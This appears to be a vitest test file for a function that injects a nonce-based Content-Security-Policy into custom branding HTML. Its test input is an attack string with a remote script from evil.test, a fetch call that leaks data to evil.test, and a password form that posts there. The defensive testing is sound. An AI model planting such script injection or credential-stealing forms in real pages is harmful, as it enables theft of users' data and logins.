import { describe, it, expect } from "vitest";
import { injectCustomBrandingIntoHtml } from "./inject";

describe("custom HTML policy", () => {
  it("allows only freshly nonced application helpers before any untrusted markup", () => {
    const attack = '<!doctype html><html><head><script src="https://evil.test/x.js"></script></head><body><script>fetch("https://evil.test/leak")</script><form action="https://evil.test"><input name="password"></form></body></html>';
    const html = injectCustomBrandingIntoHtml(attack);
    const nonce = html.match(/script-src 'nonce-([a-f0-9]{32})'/)?.[1];
    expect(nonce).toBeDefined();
    expect(html.startsWith('<!doctype html><meta http-equiv="Content-Security-Policy"')).toBe(true);
    expect(html).toContain("connect-src 'none'");
    expect(html).toContain("form-action 'none'");
    expect(html).toContain(`<script nonce="${nonce}">`);
    expect(html).toContain('<script>fetch("https://evil.test/leak")</script>');
    expect(html).not.toContain(`<script nonce="${nonce}">fetch`);
    expect(injectCustomBrandingIntoHtml(attack)).not.toContain(`nonce-${nonce}`);
  });
});
